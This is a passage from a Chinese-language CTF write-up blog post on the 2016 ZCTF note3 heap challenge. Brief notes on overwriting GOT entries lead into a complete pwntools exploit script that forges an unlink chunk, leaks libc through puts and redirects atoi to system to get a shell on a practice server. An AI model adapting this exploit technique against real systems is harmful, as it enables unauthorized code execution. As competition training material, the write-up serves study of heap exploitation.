+<p>改写freegot内容为puts，<strong>这里改写时要注意发送7个字节即可p64(puts_plt)[:-1]，如果8个字节+一个&#x2F;n,&#x2F;n最后又被置零，所以覆盖freegot时，会误覆盖freegot的下一个putsgot最低一个字节为\x00造成程序崩溃</strong></p>
+<p>改写另一个chunk指针为puts_plt，free这个chunk可以泄露地址，</p>
+<p>再改写atoi-got为system即可</p>
+<p><img src="/2023/03/15/2016-ZCTF-note2-and-note3/image-20230316002002255.png" alt="image-20230316002002255"></p>
+<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./note3&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&#x27;25662&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">newnote</span>(<span class="params">length, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;(less than 1024)&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(length).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;content:&#x27;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shownote</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;note:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">editnote</span>(<span class="params"><span class="built_in">id</span>,data</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;note:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;ent:&#x27;</span>)</span><br><span class="line">    io.sendline(data)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;success&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deletenote</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;note:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>).encode())</span><br><span class="line"><span class="comment"># db(&#x27;b *0x400B31&#x27;)# new</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x400BFB&#x27;) # delete</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x400CDA&#x27;)#edit</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x0400C89&#x27;)</span></span><br><span class="line">ptr = <span class="number">0x6020C8</span></span><br><span class="line">fakefd = ptr - <span class="number">0x18</span></span><br><span class="line">fakebk = ptr - <span class="number">0x10</span></span><br><span class="line">content = <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> + p64(<span class="number">0xa1</span>) + p64(fakefd) + p64(fakebk) + <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x48</span></span><br><span class="line">newnote(<span class="number">0x80</span>, content)</span><br><span class="line">newnote(<span class="number">0</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>)</span><br><span class="line">newnote(<span class="number">0x80</span>, <span class="string">&#x27;b&#x27;</span> * <span class="number">16</span>)</span><br><span class="line">deletenote(<span class="number">1</span>)</span><br><span class="line">content = <span class="string">b&#x27;a&#x27;</span> * <span class="number">16</span> + p64(<span class="number">0xa0</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">newnote(<span class="number">0</span>,content)</span><br><span class="line">deletenote(<span class="number">2</span>)</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(free_got)+p64(puts_got)+p64(atoi_got)</span><br><span class="line">editnote(<span class="number">0</span>,payload)</span><br><span class="line">editnote(<span class="number">0</span>,p64(puts_plt)[:-<span class="number">1</span>])</span><br><span class="line">deletenote(<span class="number">1</span>)</span><br><span class="line">rl()</span><br><span class="line">puts_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">base=puts_ad-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system=libc.dump(<span class="string">&#x27;system&#x27;</span>)+base</span><br><span class="line">editnote(<span class="number">2</span>,p64(system))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#2016-ZCTF-note2"><span class="toc-number">1.</span> <span class="toc-text">2016-ZCTF-note2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0unlink-chunk"><span class="toc-number">2.</span> <span class="toc-text">伪造unlink chunk</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#leak-%E6%8B%BFshell"><span class="toc-number">3.</span> <span class="toc-text">leak 拿shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">3.1.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2016-ZCTF-note3"><span class="toc-number">4.</span> <span class="toc-text">2016-ZCTF-note3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%E6%BA%A2%E5%87%BA%E6%96%B9%E5%BC%8F"><span class="toc-number">4.1.</span> <span class="toc-text">第一种溢出方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D%E6%BA%A2%E5%87%BA%E6%96%B9%E5%BC%8F"><span class="toc-number">4.2.</span> <span class="toc-text">第二种溢出方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E7%A7%8D"><span class="toc-number">4.3.</span> <span class="toc-text">第三种</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%A5%BD%E8%AF%B4"><span class="toc-number">4.4.</span> <span class="toc-text">其他好说</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-1"><span class="toc-number">4.5.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://grxer.gitee.io/2023/03/15/2016-ZCTF-note2-and-note3/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://grxer.gitee.io/2023/03/15/2016-ZCTF-note2-and-note3/&text=Unlink 2016-ZCTF-note2-and-note3"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://grxer.gitee.io/2023/03/15/2016-ZCTF-note2-and-note3/&title=Unlink 2016-ZCTF-note2-and-note3"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://grxer.gitee.io/2023/03/15/2016-ZCTF-note2-and-note3/&is_video=false&description=Unlink 2016-ZCTF-note2-and-note3"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Unlink 2016-ZCTF-note2-and-note3&body=Check out this article: https://grxer.gitee.io/2023/03/15/2016-ZCTF-note2-and-note3/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://grxer.gitee.io/2023/03/15/2016-ZCTF-note2-and-note3/&title=Unlink 2016-ZCTF-note2-and-note3"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://grxer.gitee.io/2023/03/15/2016-ZCTF-note2-and-note3/&title=Unlink 2016-ZCTF-note2-and-note3"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://grxer.gitee.io/2023/03/15/2016-ZCTF-note2-and-note3/&title=Unlink 2016-ZCTF-note2-and-note3"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://grxer.gitee.io/2023/03/15/2016-ZCTF-note2-and-note3/&title=Unlink 2016-ZCTF-note2-and-note3"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://grxer.gitee.io/2023/03/15/2016-ZCTF-note2-and-note3/&name=Unlink 2016-ZCTF-note2-and-note3&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://grxer.gitee.io/2023/03/15/2016-ZCTF-note2-and-note3/&t=Unlink 2016-ZCTF-note2-and-note3"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2024
+    bxz
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?a22ef0bec4e4a9c7337bea6e37ff55c1";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
